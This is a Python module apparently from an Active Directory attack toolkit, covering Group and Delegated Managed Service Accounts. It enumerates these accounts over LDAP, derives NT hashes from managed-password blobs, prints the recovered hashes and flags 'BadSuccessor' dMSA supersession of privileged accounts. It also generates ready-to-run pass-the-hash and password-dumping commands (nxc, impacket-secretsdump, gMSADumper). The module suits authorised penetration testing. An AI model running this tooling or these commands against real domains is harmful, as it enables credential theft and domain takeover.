"""
gMSA / dMSA module — Group & Delegated Managed Service Accounts.

Two LDAP-native, identity-relative wins:

* **Managed-password read (gMSA & dMSA)** — a DC returns the constructed
  `msDS-ManagedPassword` attribute (MSDS-MANAGEDPASSWORD_BLOB) only to principals
  listed in the account's `msDS-GroupMSAMembership` security descriptor. When the
  current identity is authorised, the cleartext password is in that blob →
  derive the NT hash (`utils.gmsa`) → pass-the-hash as the service account. If
  the account is itself privileged, that is frequently domain compromise. The
  module also parses the membership SD to report *who* may read it (and whether
  the current identity can) even when the DC did not return the blob on this bind.

* **dMSA / BadSuccessor (Server 2025)** — delegated MSAs carry
  `msDS-ManagedAccountPrecededByLink` (the account the dMSA supersedes) and
  `msDS-DelegatedMSAState`. A fully-migrated dMSA that supersedes a privileged
  account yields that account's privileges to whoever controls the dMSA. The
  BadSuccessor primitive (creating/writing a dMSA to inherit a target) hinges on
  write access to an OU — an ACL finding — so this module inventories dMSAs and
  flags privileged supersessions, with an advisory, rather than re-scanning OUs.

⚠️ NOT VALIDATED LIVE (v2.6.0): implemented and unit-tested against mocked
   records and a synthetic managed-password blob, but never run against a real
   gMSA/dMSA-bearing DC.
"""

from modules.base import BaseModule, ScanContext
from core.output import Severity, C
from utils.ldap_helpers import get_attr, get_int, get_list, get_raw, get_dn, SCOPE_BASE
from utils.sids import (
    resolve_sid, bytes_to_sid, is_privileged_sid, is_high_value_sid,
)
from utils.uac import uac_has, UAC_DISABLED
from utils.gmsa import nt_hash_from_blob

GMSA_CLASS = "msds-groupmanagedserviceaccount"
DMSA_CLASS = "msds-delegatedmanagedserviceaccount"

_FILTER = ("(|(objectClass=msDS-GroupManagedServiceAccount)"
           "(objectClass=msDS-DelegatedManagedServiceAccount))")

_ATTRS = [
    "sAMAccountName", "objectClass", "objectSid", "userAccountControl",
    "servicePrincipalName", "memberOf", "description",
    "msDS-ManagedPassword",
    "msDS-GroupMSAMembership",
    "pwdLastSet",
    # dMSA-specific
    "msDS-DelegatedMSAState",
    "msDS-ManagedAccountPrecededByLink",
]

# msDS-DelegatedMSAState
_DMSA_STATE = {
    0: "no migration",
    1: "migration in progress",
    2: "migration completed (supersedes the linked account)",
}

# High-privilege groups (substring DN match) — a managed account in one of these
# makes a recovered password domain-impactful.
_PRIV_GROUPS = (
    "domain admins", "enterprise admins", "schema admins", "administrators",
    "account operators", "backup operators", "server operators",
    "print operators", "group policy creator owners", "key admins",
    "enterprise key admins", "dnsadmins", "exchange windows permissions",
    "organization management",
)

# Broad low-priv principals any authenticated user belongs to (as in adcs.py).
_LOW_PRIV_WELL_KNOWN = {"S-1-1-0", "S-1-5-11", "S-1-5-32-545"}
_LOW_PRIV_RIDS = {"513", "514", "515"}


def _is_low_priv_sid(sid: str, domain_sid: str) -> bool:
    if sid in _LOW_PRIV_WELL_KNOWN:
        return True
    if domain_sid and sid.startswith(domain_sid + "-"):
        return sid[len(domain_sid) + 1:] in _LOW_PRIV_RIDS
    return False


def _priv_group_hits(member_of) -> list:
    hits = []
    for g in member_of:
        gl = g.lower()
        for p in _PRIV_GROUPS:
            if p in gl:
                cn = g.split(",")[0].split("=", 1)[-1]
                if cn not in hits:
                    hits.append(cn)
    return hits


class GMSAModule(BaseModule):
    name        = "gmsa"
    description = "gMSA/dMSA enumeration, managed-password read (PtH) and dMSA/BadSuccessor"

    def run(self, ctx: ScanContext) -> None:
        out = ctx.out
        out.section("gMSA / dMSA — MANAGED SERVICE ACCOUNTS")

        try:
            entries = ctx.conn.search(_FILTER, _ATTRS)
        except Exception as e:
            out.warning(f"Managed-account search failed: {e}")
            return

        if not entries:
            out.info("No gMSA/dMSA accounts found")
            return

        def _classes(e):
            return [c.lower() for c in get_list(e, "objectClass")]

        gmsas = [e for e in entries if GMSA_CLASS in _classes(e)]
        dmsas = [e for e in entries if DMSA_CLASS in _classes(e)]
        out.counter("Managed accounts", len(entries),
                    {"gMSA": len(gmsas), "dMSA": len(dmsas)})
        ctx.ldap_identity_count += len(entries)

        cur = ctx.current_user_sids
        rows = []
        for e in entries:
            rows.append(self._process(ctx, e, cur, is_dmsa=DMSA_CLASS in _classes(e)))

        out.subsection("Managed accounts")
        out.table(
            ["Account", "Type", "Enabled", "Pwd read", "Note"],
            [r["row"] for r in rows],
            highlight_fn=lambda r: C.RED if (r[3] == "YES" or "[priv]" in r[4]) else None,
            indent=4,
        )

    # ------------------------------------------------------------------
    def _process(self, ctx: ScanContext, e, cur, is_dmsa: bool) -> dict:
        out    = ctx.out
        sam    = get_attr(e, "sAMAccountName") or get_dn(e)
        uac    = get_int(e, "userAccountControl")
        enabled = not uac_has(uac, UAC_DISABLED)
        mof    = get_list(e, "memberOf")
        priv_hits = _priv_group_hits(mof)

        # Who may read the managed password (parse the membership SD).
        allowed_names, allowed_sids = self._membership(ctx, e)
        identity_allowed = bool(cur) and any(s in cur for s in allowed_sids)
        low_priv_readers = [n for (n, s) in zip(allowed_names, allowed_sids)
                            if _is_low_priv_sid(s, ctx.domain_sid)]

        # Did the DC actually hand us the cleartext blob?
        blob = get_raw(e, "msDS-ManagedPassword")
        nt   = nt_hash_from_blob(blob) if blob else None

        typ = "dMSA" if is_dmsa else "gMSA"
        note_bits = []
        if priv_hits:
            note_bits.append(f"[priv] member of {', '.join(priv_hits)}")

        # dMSA supersession (BadSuccessor surface)
        preceded_priv = False
        if is_dmsa:
            state = get_int(e, "msDS-DelegatedMSAState")
            preceded = get_attr(e, "msDS-ManagedAccountPrecededByLink")
            if preceded:
                pname, preceded_priv = self._resolve_preceded(ctx, preceded)
                tag = "[priv] " if preceded_priv else ""
                note_bits.append(f"supersedes {tag}{pname} ({_DMSA_STATE.get(state, state)})")
            elif state:
                note_bits.append(_DMSA_STATE.get(state, f"state {state}"))

        pwd_read = "YES" if nt else ("auth*" if identity_allowed else "no")

        # ---- Findings ----
        if nt:
            self._qw_password(ctx, sam, nt, typ, priv_hits)
        elif identity_allowed:
            self._qw_authorized(ctx, sam, typ, priv_hits)

        if low_priv_readers:
            ctx.quick_wins.add(
                Severity.HIGH,
                f"{typ} {sam} — managed password readable by a low-priv principal",
                "A broad low-privilege principal is in msDS-GroupMSAMembership, so "
                "any such user can retrieve the password and pass-the-hash as the "
                f"account:\n  readers: {', '.join(low_priv_readers)}",
            )

        if is_dmsa and preceded_priv:
            ctx.quick_wins.add(
                Severity.CRITICAL,
                f"dMSA {sam} — supersedes a PRIVILEGED account (BadSuccessor)",
                "This delegated MSA is linked to a privileged account via "
                "msDS-ManagedAccountPrecededByLink. Authenticating as the dMSA "
                "yields the superseded account's privileges (its KERB key list is "
                "migrated).\n"
                "  # Request a TGT for the dMSA and inspect the migrated keys:\n"
                "  certipy-ad / impacket getTGT as the dMSA, then use the PAC/keys.",
            )

        # Inline detail for noteworthy accounts
        if nt or identity_allowed or priv_hits or (is_dmsa and preceded_priv):
            tag = f"{C.RED}" if (nt or preceded_priv) else f"{C.YELLOW}"
            print(f"\n    {tag}{sam}{C.RESET}  ({typ})")
            if get_list(e, "servicePrincipalName"):
                out.kv("    SPNs", ", ".join(get_list(e, "servicePrincipalName")[:3]), indent=6)
            if allowed_names:
                out.kv("    Pwd readers", ", ".join(allowed_names), indent=6)
            if nt:
                out.kv("    NT hash", nt, indent=6)
            for nb in note_bits:
                out.kv("    Note", nb, indent=6)

        return {"row": [sam, typ, "yes" if enabled else "no", pwd_read,
                        "; ".join(note_bits) or "-"]}

    # ------------------------------------------------------------------
    @staticmethod
    def _membership(ctx, e):
        """Parse msDS-GroupMSAMembership (a security descriptor) → (names, sids)
        of principals allowed to retrieve the managed password."""
        raw = get_raw(e, "msDS-GroupMSAMembership")
        if not raw:
            return [], []
        try:
            from modules.acls import _parse_dacl
            aces = _parse_dacl(raw)
        except Exception:
            return [], []
        names, sids, seen = [], [], set()
        for ace in aces:
            sid = ace.get("sid")
            if not sid or sid in seen:
                continue
            seen.add(sid)
            sids.append(sid)
            names.append(resolve_sid(sid, ctx.domain_sid))
        return names, sids

    @staticmethod
    def _resolve_preceded(ctx, dn: str):
        """Resolve the superseded account DN → (name, is_privileged)."""
        name = dn.split(",")[0].split("=", 1)[-1] if dn else dn
        try:
            res = ctx.conn.search("(objectClass=*)",
                                  ["objectSid", "sAMAccountName", "adminCount"],
                                  base=dn, scope=SCOPE_BASE)
        except Exception:
            res = []
        if not res:
            return name, False
        sid = bytes_to_sid(get_raw(res[0], "objectSid") or b"")
        name = get_attr(res[0], "sAMAccountName") or name
        priv = (is_privileged_sid(sid, ctx.domain_sid)
                or is_high_value_sid(sid, ctx.domain_sid)
                or get_int(res[0], "adminCount") == 1)
        return name, priv

    # ------------------------------------------------------------------
    @staticmethod
    def _creds(ctx):
        a = ctx.args
        user   = (getattr(a, "username", "") or "").split("@")[0]
        pw     = getattr(a, "password", "") or ""
        domain = ctx.domain or (getattr(a, "domain", "") or "")
        dc     = getattr(a, "dc", "") or ""
        return user, pw, domain, dc

    def _qw_password(self, ctx, sam, nt, typ, priv_hits):
        _u, _p, domain, dc = self._creds(ctx)
        acct = sam if sam.endswith("$") else sam + "$"
        sev = Severity.CRITICAL
        extra = ("\n  # This account is privileged (" + ", ".join(priv_hits) +
                 ") → likely domain compromise.") if priv_hits else ""
        ctx.quick_wins.add(
            sev,
            f"{typ} {sam} — managed password RECOVERED (NT hash)",
            f"The DC returned the managed password; NT hash: {nt}\n"
            f"Pass-the-hash as the service account:\n"
            f"  nxc smb {dc} -u '{acct}' -H {nt}\n"
            f"  impacket-secretsdump '{domain}/{acct}@{dc}' -hashes :{nt}\n"
            f"  python3 listdap.py -dc {dc} -u '{acct}' -H {nt}" + extra,
        )

    def _qw_authorized(self, ctx, sam, typ, priv_hits):
        user, pw, domain, dc = self._creds(ctx)
        secret = f"-p '{pw}'" if pw else "-k"
        sev = Severity.HIGH if priv_hits else Severity.MEDIUM
        ctx.quick_wins.add(
            sev,
            f"{typ} {sam} — current identity is authorised to read the password",
            "msDS-GroupMSAMembership grants the current identity, but the blob was "
            "not returned on this bind. Retrieve it explicitly:\n"
            f"  nxc ldap {dc} -u '{user}' {secret} --gmsa\n"
            f"  python3 gMSADumper.py -u '{user}' {('-p ' + repr(pw)) if pw else ''} "
            f"-d {domain} -l {dc}"
            + (f"\n  # Account is privileged ({', '.join(priv_hits)})." if priv_hits else ""),
        )
